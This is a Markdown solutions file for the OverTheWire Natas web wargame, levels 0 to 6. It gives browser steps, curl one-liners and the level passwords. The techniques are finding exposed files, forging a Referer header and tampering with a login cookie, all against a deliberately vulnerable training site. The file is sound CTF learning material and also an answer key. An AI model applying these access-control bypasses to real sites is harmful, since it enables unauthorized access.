# Solution

---

- natas0
    - ```Login to web:```
    - ```inspec element the page and look for comments```

- other solution:
    - ```view-source:http://natas0.natas.labs.overthewire.org/```

- curl:
    - ```curl -sv http://natas0.natas.labs.overthewire.org/ --user natas0:natas0 | grep -oe '<!--[A-Za-z].*' | cut -d ' ' -f6```

- python:
    - [natas0/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas1/solve.py)

- natas1
    - ```Login to web:```
    - ```view-source:http://natas0.natas.labs.overthewire.org/```

- curl:
    - ```curl -sv http://natas1.natas.labs.overthewire.org --user natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto | grep -o '<!--[A-Za-z].*' | awk '{print $6}'```
- python:
    - [natas1/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas1/solve.py)

- natas2
    - ```Login to web:```
    - ```view-source:http://natas2.natas.labs.overthewire.org```
    - ```click on files/pixel.png```
    - ```go back one directory and found users.txt```

- curl:
    - ```curl -sv http://natas2.natas.labs.overthewire.org/files/users.txt --user natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi | grep natas3 | awk -F: '{print $2}'```

- python:
    - [natas2/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas2/solve.py)

- natas3
    - ```Login to web:```
    - ```view-source:http://natas3.natas.labs.overthewire.org```
    - ```HINT:Not even Google will find it this time...```
    - ```http://natas3.natas.labs.overthewire.org/robots.txt```
    - ```Found: /s3cr3t/```
    - ```http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt```

- curl:
    - ```curl -sv http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt --user natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 | grep natas4 | cut -d':' -f2```

- python:
    - [natas3/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas3/solve.py)

- natas4
    - ```Login to web:```
    - ```Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/" ```
    - ```Intercept data using proxy and burpsuite```
    - ```refresh page```
    - ```get a referer header from burpsuite: Referer: http://natas4.natas.labs.overthewire.org/index.php```
    - ```Send packet after changing request header to http://natas5.natas.labs.overthewire.org/```

- curl:
    - ```curl -sv http://natas4.natas.labs.overthewire.org/index.php -H "Referer: http://natas5.natas.labs.overthewire.org/" --user natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ | grep "Access" | cut -d' ' -f8```

-python:
    - [natas4/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas4/solve.py)

- natas5
    - ```Login to web:```
    - ```Access disallowed. You are not logged in```
    - ```It might be a problem with the session / cookie by the error```
    - ```Chrome:```
        - ```Developer tools -> Application -> Storage -> Cookies -> loggedin 0 changed to 1 -> refresh```
    - ```Firefox:```
        - ```Developer tools -> Storage -> Cookies -> loggedin 0 changed to 1 -> refresh```
    - ```BurpSuite:```
        - ```Intercept data with burp proxy > changed Cookie: __utma=176859643.542715508.1591005549.1591005549.1591025816.2; __utmc=176859643; __utmz=176859643.1591005549.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmb=176859643.7.10.1591025816; loggedin=1 -> Forward```

- curl:
    - ```curl -sv http://natas5.natas.labs.overthewire.org/ --user natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq --cookie 'loggedin=1' | grep "Access" | sed s'/<\/div>//g' | awk '{print $8}'```

- python:
    - [natas5/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas5/solve.py)

- natas6
    - ```Login to web:```
    - ```Input Secret:```
    - ```View the source code, found an includes file include "includes/secret.inc";```
    - ```view-source:http://natas6.natas.labs.overthewire.org/includes/secret.inc```
    - ```input the secret code: FOEIUWGHFEEUHOFUOIU```

- curl:
    - ```curl -X POST -sv http://natas6.natas.labs.overthewire.org/ --user natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 -F secret=FOEIUWGHFEEUHOFUOIU -F submit=submit | grep "Access" | awk '{print $8}'```
    - ```curl -X POST -sv http://natas6.natas.labs.overthewire.org/ --user natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 -H 'Content-Type: application/x-www-form-urlencoded' -d 'secret=FOEIUWGHFEEUHOFUOIU&submit=submit' | grep "Access" | awk '{print $8}'```

- python:
    [natas6/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas6/solve.py)